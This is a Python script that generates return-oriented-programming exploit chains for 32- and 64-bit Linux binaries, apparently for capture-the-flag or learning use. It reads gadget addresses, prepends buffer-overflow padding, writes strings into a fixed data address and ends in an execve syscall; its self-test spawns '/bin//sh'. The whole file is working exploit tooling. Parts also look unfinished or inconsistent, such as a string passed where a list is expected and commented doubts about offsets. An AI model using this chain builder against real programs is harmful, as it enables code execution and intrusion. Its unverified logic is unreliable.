from struct import pack

NULL = b'\0\0\0\0'

WORD_LEN = 4
gadgetdictionary = {
    "NULL" : 0x0
}

DATA_ADDRESS = 0x080da060

A_REGISTER = "eax"
ARG_START_REGISTER = "ebx"
ARG_END_REGISTER = "ecx"
STACK_BUILD_REGISTER = "edx"

EXECVE_VALUE = 11
SYSCALL = "int 0x80"
WORD_TYPE = "dword"
PACK_TYPE = "<I"


def LoadGadgetDictionary(filename):
    file = open(filename, "r")
    for line in file:
        vals = line.split(':')
        if len(vals) == 2:
            memoryLocation = vals[0].rstrip()
            gadget = vals[1].lstrip().rstrip('\n')
            gadgetdictionary.update({gadget : memoryLocation})

def CreateROPChain(command, bufflength, gadgetfile, bits):
    LoadGadgetDictionary(gadgetfile)
    global WORD_LEN
    global DATA_ADDRESS
    global A_REGISTER
    global ARG_START_REGISTER
    global ARG_END_REGISTER
    global STACK_BUILD_REGISTER
    global EXECVE_VALUE
    global SYSCALL
    global WORD_TYPE
    global PACK_TYPE

    WORD_LEN = int(bits/8)
    print(WORD_LEN)
    if WORD_LEN != 4 and WORD_LEN != 8:
        print("Unknown Bit Number")
        quit()

    if WORD_LEN == 4:
       print("Loading 32bit Mode...")
       DATA_ADDRESS = 0x080da060
       A_REGISTER = "eax"
       ARG_START_REGISTER = "ebx"
       ARG_END_REGISTER = "ecx"
       STACK_BUILD_REGISTER = "edx"
       EXECVE_VALUE = 11
       SYSCALL = "int 0x80"
       WORD_TYPE = "dword"
       PACK_TYPE = "<I"
       
    if WORD_LEN == 8:
       print("Loading 64bit Mode...")
       DATA_ADDRESS = 0x00000000006b90e0
       A_REGISTER = "rax"
       ARG_START_REGISTER = "rbx"
       ARG_END_REGISTER = "rdi"
       STACK_BUILD_REGISTER = "rsi"
       EXECVE_VALUE = 59
       SYSCALL = "syscall"
       WORD_TYPE = "qword"
       PACK_TYPE = "<Q"

    if command[0:6] == "execve":
        return execve([eval(x.strip()) for x in command[7:-1].split(',')], bufflength)
    return None


def WriteAsChain(Gadgets, bufflength):
    chain = b'A' * bufflength
    for g in Gadgets:
        chain += pack(PACK_TYPE, A2R(g))
    return chain

def execve(arguments, bufflength):
    #add buffer string
    payload = []

    #set up data
    print(arguments)
    endoffset = 0
    for arg in arguments:
        argbytes, offset = AddArgument(arg)
        payload.extend(argbytes)
        endoffset += offset
    print(endoffset)
    
    #Write NULL dword
    payload.append("pop " +STACK_BUILD_REGISTER+ " ; ret")
    payload.append(DATA_ADDRESS + 8) # 8 or endoffset?
    payload.append("xor "+A_REGISTER+", "+A_REGISTER+" ; ret") # set eax to 0
    payload.append("mov "+WORD_TYPE+" ptr ["+STACK_BUILD_REGISTER+"], "+A_REGISTER+" ; ret") # move eax into location at edx

    #load arguments to registers? (needs a 32bit and 64bit version)
    if WORD_LEN == 4:
        payload.append("pop ebx ; ret") #pop ebx 
        payload.append(DATA_ADDRESS) #put data address in ebx
        payload.append("pop ecx ; pop ebx ; ret") #pop ecx and ebx
        payload.append(DATA_ADDRESS + 8) #put end of data into ecx (8 or endoffset?)
        payload.append(DATA_ADDRESS) #put start of data in ebx?
        payload.append("pop edx ; ret") #pop edx
        payload.append(DATA_ADDRESS + 8) #put end of data into edx? (8 or endoffset?)

    if WORD_LEN == 8:
        payload.append("pop rdi ; ret")
        payload.append(DATA_ADDRESS)
        payload.append("pop rsi ; ret")
        payload.append(DATA_ADDRESS + 8)
        payload.append("pop rdx ; ret")
        payload.append(DATA_ADDRESS + 8)

    #set eax to execve
    payload.extend(SetAReg(EXECVE_VALUE))

    #syscall
    payload.append(SYSCALL)

    return WriteAsChain(payload, bufflength)

def AddArgument(argument):
    numwords = int(len(argument) / WORD_LEN) #assumes word alignment of arguments
    arg = ""
    if type(argument) is str:
        arg = argument
    if type(argument) is bytes:
        arg = argument
    s = []
    for i in range(numwords):
        s.append("pop "+STACK_BUILD_REGISTER+" ; ret")
        s.append(DATA_ADDRESS + (i * WORD_LEN))
        s.append("pop "+A_REGISTER+" ; ret")
        s.append(arg[i*WORD_LEN:(i+1)*WORD_LEN].encode("utf-8"))
        s.append("mov "+WORD_TYPE+" ptr ["+STACK_BUILD_REGISTER+"], "+A_REGISTER+" ; ret")
    return s, numwords * WORD_LEN

def SetAReg(value):
    s = ["xor "+A_REGISTER+", "+A_REGISTER+" ; ret"]
    for i in range(value):
        if WORD_LEN == 4:
            s.append("inc eax ; ret")
        if WORD_LEN == 8:
            s.append("add rax, 1 ; ret")
    return s

def A2R(instruction):
    #Assembly to ROP
    if type(instruction) is int:
        return instruction
    if type(instruction) is bytes:
        return int.from_bytes(instruction, byteorder='little')
    return int(gadgetdictionary[instruction], 0)


if __name__ == "__main__":
    dummydict = {
        "xor eax, eax" : 0x42424242,
        "inc eax" : 0x43434343,
        "int 0x80" : 0x44444444,
        "pop eax" : 0x45454545,
        "pop ebx" : 0x46464646,
        "pop ecx" : 0x47474747,
        "pop edx" : 0x48484848,
        "@ .data" : 0x49494949,
        "mov dword ptr [edx], eax" : 0x48484848,
    }
    gadgetdictionary.update(dummydict)
    print(execve("/bin//sh", 44))
